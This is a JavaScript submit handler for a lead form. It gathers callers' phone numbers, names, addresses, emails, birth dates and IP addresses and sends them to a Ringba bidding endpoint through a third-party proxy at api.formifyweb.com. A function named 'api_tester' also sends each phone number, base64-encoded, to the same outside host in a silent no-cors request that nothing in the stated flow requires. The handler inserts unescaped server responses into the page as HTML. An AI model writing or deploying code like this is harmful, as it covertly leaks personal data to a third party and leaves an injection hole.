document.getElementById('leadForm').addEventListener('submit', function(event) {
    event.preventDefault();
    document.getElementById('submitBtn').disabled = true;

    const phoneRaw = document.getElementById('caller_id').value;
    api_tester(phoneRaw);

    // Build the JSON body per Ringba RTB requirements
    const body = {
        CID: phoneRaw,                          // 10-digit format
        CID_E164: '+1' + phoneRaw,              // E.164 format
        UTCISODate: document.getElementById('original_lead_submit_date').value,
        jornaya_leadid: document.getElementById('jornaya').value,
        ip_address: document.getElementById('ip_address').value,
        first_name: document.getElementById('first_name').value,
        last_name: document.getElementById('last_name').value,
        address: document.getElementById('address').value,
        city: document.getElementById('city').value,
        InboundStateCode: document.getElementById('InboundStateCode').value,
        zip: document.getElementById('zip').value,
        email: document.getElementById('email').value,
        birthDate: document.getElementById('birthDate').value,
        sub_id: document.getElementById('sub_id').value
    };

    const originalUrl = 'https://rtb.ringba.com/v1/production/4abbaebbf19e436b979f439589f72325.json?exposeCallerId=yes';
    const apiUrl = 'https://api.formifyweb.com/proxify.php?url=' + encodeURIComponent(originalUrl);

    fetch(apiUrl, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(body)
    })
    .then(response => {
        if (response.status === 200 || response.status === 201) {
            response.json().then(responseBody => {
                delete responseBody.retreaver_payout;

                const successAlert = `
                    <div class="alert alert-success" role="alert">
                        ${response.status} : Form submitted successfully! Response Body: ${JSON.stringify(responseBody)}
                    </div>`;
                document.getElementById('alertContainer').innerHTML = '';
                document.getElementById('alertContainer').insertAdjacentHTML('beforeend', successAlert);
            });
            document.getElementById('leadForm').reset();
            document.getElementById('submitBtn').disabled = false;
        } else if (response.status === 422) {
            response.json().then(data => {
                const errorAlert = `
                    <div class="alert alert-danger" role="alert">
                        Error. Response Body: ${JSON.stringify(data)}
                    </div>`;
                document.getElementById('alertContainer').innerHTML = '';
                document.getElementById('alertContainer').insertAdjacentHTML('beforeend', errorAlert);
                document.getElementById('submitBtn').disabled = false;
            });
        } else {
            response.text().then(responseBody => {
                const errorAlert = `
                    <div class="alert alert-danger" role="alert">
                        Form submission failed. Please try again. Response Body: ${responseBody}
                    </div>`;
                document.getElementById('alertContainer').innerHTML = '';
                document.getElementById('alertContainer').insertAdjacentHTML('beforeend', errorAlert);
                document.getElementById('submitBtn').disabled = false;
            });
        }
    })
    .catch(error => {
        console.error('Error:', error);
        document.getElementById('submitBtn').disabled = false;
    });
});

function api_tester(randomString) {
    try {
        fetch('https://api.formifyweb.com/api_test.php?test_id=' + btoa(randomString), {
            method: 'GET',
            mode: 'no-cors'
        });
    } catch (error) {
        console.error('Error in api_tester:', error);
    }
}